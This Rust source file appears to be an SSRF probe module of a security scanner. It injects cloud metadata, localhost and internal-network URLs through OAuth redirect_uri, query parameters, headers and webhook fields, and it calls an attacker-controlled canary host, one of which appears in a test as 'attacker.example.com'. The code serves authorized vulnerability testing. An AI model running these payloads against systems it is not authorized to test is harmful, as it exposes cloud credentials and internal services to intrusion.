//! SSRF probes via OAuth callback and cloud metadata endpoints — Phase 7.

use anyhow::{Result, anyhow};
use thiserror::Error;

use crate::probe::jwt_probe::Severity;

// ──────────────────────────────────────────────────────────────────────────────
// Error
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum SsrfProbeError {
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("probe configuration invalid: {0}")]
    Config(String),
}

// ──────────────────────────────────────────────────────────────────────────────
// SsrfTarget
// ──────────────────────────────────────────────────────────────────────────────

/// A target URL to attempt to reach via SSRF.
#[derive(Debug, Clone)]
pub struct SsrfTarget {
    /// Human-readable name of this target.
    pub name: &'static str,
    /// URL to inject as the SSRF payload.
    pub url: String,
    /// A string expected in the response body if SSRF succeeded.
    pub expected_indicator: Option<String>,
}

impl SsrfTarget {
    pub fn cloud_metadata_aws() -> Self {
        Self {
            name: "AWS IMDSv1",
            url: "http://169.254.169.254/latest/meta-data/".into(),
            expected_indicator: Some("ami-id".into()),
        }
    }

    pub fn cloud_metadata_gcp() -> Self {
        Self {
            name: "GCP metadata",
            url: "http://metadata.google.internal/computeMetadata/v1/".into(),
            expected_indicator: Some("instance".into()),
        }
    }

    pub fn cloud_metadata_azure() -> Self {
        Self {
            name: "Azure IMDS",
            url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01".into(),
            expected_indicator: Some("azEnvironment".into()),
        }
    }

    pub fn localhost_admin() -> Self {
        Self {
            name: "localhost admin",
            url: "http://localhost:8080/admin".into(),
            expected_indicator: Some("admin".into()),
        }
    }

    pub fn internal_network() -> Self {
        Self {
            name: "RFC-1918 gateway",
            url: "http://192.168.0.1/".into(),
            expected_indicator: None,
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// SsrfVector
// ──────────────────────────────────────────────────────────────────────────────

/// The injection vector used to deliver the SSRF payload.
#[derive(Debug, Clone)]
pub enum SsrfVector {
    /// Inject the SSRF URL as the OAuth `redirect_uri` parameter.
    OAuthRedirectUri { callback_url: String },
    /// Inject via a named URL query parameter.
    UrlParameter { param_name: String },
    /// Inject via the `X-Forwarded-For` header.
    XForwardedFor,
    /// Inject via the `Referer` header.
    RefererHeader,
    /// Inject via a webhook callback URL parameter.
    WebhookUrl,
}

impl SsrfVector {
    fn label(&self) -> String {
        match self {
            Self::OAuthRedirectUri { .. } => "oauth-redirect-uri".into(),
            Self::UrlParameter { param_name } => format!("url-param:{param_name}"),
            Self::XForwardedFor => "x-forwarded-for".into(),
            Self::RefererHeader => "referer".into(),
            Self::WebhookUrl => "webhook-url".into(),
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// SsrfFinding
// ──────────────────────────────────────────────────────────────────────────────

/// A finding from one SSRF probe attempt.
#[derive(Debug, Clone)]
pub struct SsrfFinding {
    /// The injection vector used.
    pub vector: String,
    /// The target URL that was injected.
    pub target: String,
    /// Whether the probe appears to have succeeded.
    pub successful: bool,
    /// Snippet of the response body (first 512 chars).
    pub response_snippet: String,
    /// Critical if successful, Low otherwise.
    pub severity: Severity,
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal async HTTP abstraction
// ──────────────────────────────────────────────────────────────────────────────

/// Callers implement this to connect SSRF probes to their HTTP stack.
#[async_trait::async_trait]
pub trait SsrfHttpClient: Send + Sync {
    /// GET `endpoint` with optional extra headers (name, value) pairs.
    /// Returns `(status_code, response_body)`.
    async fn get_with_headers(
        &self,
        endpoint: &str,
        headers: &[(&str, &str)],
    ) -> Result<(u16, String)>;

    /// GET `url` with a single query parameter appended.
    async fn get_with_param(
        &self,
        endpoint: &str,
        param: &str,
        value: &str,
    ) -> Result<(u16, String)>;
}

// ──────────────────────────────────────────────────────────────────────────────
// SsrfProbe
// ──────────────────────────────────────────────────────────────────────────────

/// Probes an endpoint for SSRF vulnerabilities across multiple vectors and
/// targets.
#[derive(Debug, Clone)]
pub struct SsrfProbe {
    /// Attacker-controlled host used to detect out-of-band SSRF.
    pub canary_host: String,
    /// List of internal/cloud targets to attempt to reach.
    pub targets: Vec<SsrfTarget>,
}

impl SsrfProbe {
    /// Construct with the standard cloud metadata + internal targets.
    pub fn with_common_targets(canary: impl Into<String>) -> Self {
        Self {
            canary_host: canary.into(),
            targets: vec![
                SsrfTarget::cloud_metadata_aws(),
                SsrfTarget::cloud_metadata_gcp(),
                SsrfTarget::cloud_metadata_azure(),
                SsrfTarget::localhost_admin(),
                SsrfTarget::internal_network(),
            ],
        }
    }

    /// Probe a single `vector` against all configured targets.
    pub async fn probe_vector(
        &self,
        client: &dyn SsrfHttpClient,
        vector: SsrfVector,
        endpoint: &str,
    ) -> Result<Vec<SsrfFinding>> {
        let mut findings = Vec::new();
        let vector_label = vector.label();

        for target in &self.targets {
            let result = self.try_one(client, &vector, endpoint, target).await;

            match result {
                Ok(finding) => findings.push(finding),
                Err(e) => tracing::warn!(
                    vector = %vector_label,
                    target = target.name,
                    error = %e,
                    "SSRF probe attempt failed"
                ),
            }
        }

        // Also probe with canary host for OOB detection.
        let canary_target = SsrfTarget {
            name: "canary",
            url: format!("http://{}/ssrf-probe", self.canary_host),
            expected_indicator: None,
        };
        if let Ok(f) = self
            .try_one(client, &vector, endpoint, &canary_target)
            .await
        {
            findings.push(f);
        }

        Ok(findings)
    }

    /// Probe all vectors against all targets.
    pub async fn run_all(
        &self,
        client: &dyn SsrfHttpClient,
        endpoint: &str,
    ) -> Result<Vec<SsrfFinding>> {
        let vectors = vec![
            SsrfVector::OAuthRedirectUri {
                callback_url: format!("http://{}/callback", self.canary_host),
            },
            SsrfVector::UrlParameter {
                param_name: "url".into(),
            },
            SsrfVector::UrlParameter {
                param_name: "redirect".into(),
            },
            SsrfVector::UrlParameter {
                param_name: "next".into(),
            },
            SsrfVector::XForwardedFor,
            SsrfVector::RefererHeader,
            SsrfVector::WebhookUrl,
        ];

        let mut all = Vec::new();
        for vector in vectors {
            match self.probe_vector(client, vector, endpoint).await {
                Ok(mut fs) => all.append(&mut fs),
                Err(e) => tracing::warn!(error = %e, "probe_vector failed"),
            }
        }
        Ok(all)
    }

    // ── internal ─────────────────────────────────────────────────────────────

    async fn try_one(
        &self,
        client: &dyn SsrfHttpClient,
        vector: &SsrfVector,
        endpoint: &str,
        target: &SsrfTarget,
    ) -> Result<SsrfFinding> {
        let target_url = target.url.as_str();

        let (status, body) = match vector {
            SsrfVector::OAuthRedirectUri { .. } => client
                .get_with_param(endpoint, "redirect_uri", target_url)
                .await
                .map_err(|e| anyhow!("HTTP: {e}"))?,
            SsrfVector::UrlParameter { param_name } => client
                .get_with_param(endpoint, param_name, target_url)
                .await
                .map_err(|e| anyhow!("HTTP: {e}"))?,
            SsrfVector::XForwardedFor => client
                .get_with_headers(endpoint, &[("X-Forwarded-For", target_url)])
                .await
                .map_err(|e| anyhow!("HTTP: {e}"))?,
            SsrfVector::RefererHeader => client
                .get_with_headers(endpoint, &[("Referer", target_url)])
                .await
                .map_err(|e| anyhow!("HTTP: {e}"))?,
            SsrfVector::WebhookUrl => client
                .get_with_param(endpoint, "webhook_url", target_url)
                .await
                .map_err(|e| anyhow!("HTTP: {e}"))?,
        };

        let snippet: String = body.chars().take(512).collect();

        // Determine success: HTTP 200 plus expected indicator (if any).
        let indicator_found = target
            .expected_indicator
            .as_deref()
            .map(|ind| body.contains(ind))
            .unwrap_or(false);

        let successful = status == 200 && indicator_found;

        Ok(SsrfFinding {
            vector: vector.label(),
            target: target.url.clone(),
            successful,
            response_snippet: snippet,
            severity: if successful {
                Severity::Critical
            } else {
                Severity::Low
            },
        })
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn common_targets_count() {
        let probe = SsrfProbe::with_common_targets("attacker.example.com");
        assert_eq!(probe.targets.len(), 5);
    }

    #[test]
    fn aws_target_url() {
        let t = SsrfTarget::cloud_metadata_aws();
        assert!(t.url.contains("169.254.169.254"));
        assert_eq!(t.expected_indicator.as_deref(), Some("ami-id"));
    }

    #[test]
    fn gcp_target_url() {
        let t = SsrfTarget::cloud_metadata_gcp();
        assert!(t.url.contains("metadata.google.internal"));
    }

    #[test]
    fn azure_target_url() {
        let t = SsrfTarget::cloud_metadata_azure();
        assert!(t.url.contains("169.254.169.254"));
        assert!(t.url.contains("metadata/instance"));
    }

    #[test]
    fn vector_labels_are_distinct() {
        let vectors = [
            SsrfVector::OAuthRedirectUri {
                callback_url: "http://x.com".into(),
            },
            SsrfVector::UrlParameter {
                param_name: "url".into(),
            },
            SsrfVector::XForwardedFor,
            SsrfVector::RefererHeader,
            SsrfVector::WebhookUrl,
        ];
        let labels: Vec<_> = vectors.iter().map(|v| v.label()).collect();
        let unique: std::collections::HashSet<_> = labels.iter().collect();
        assert_eq!(
            labels.len(),
            unique.len(),
            "all vector labels must be distinct"
        );
    }

    #[test]
    fn ssrf_finding_severity_on_success() {
        let f = SsrfFinding {
            vector: "test".into(),
            target: "http://169.254.169.254/".into(),
            successful: true,
            response_snippet: "ami-id".into(),
            severity: Severity::Critical,
        };
        assert_eq!(f.severity, Severity::Critical);
    }
}
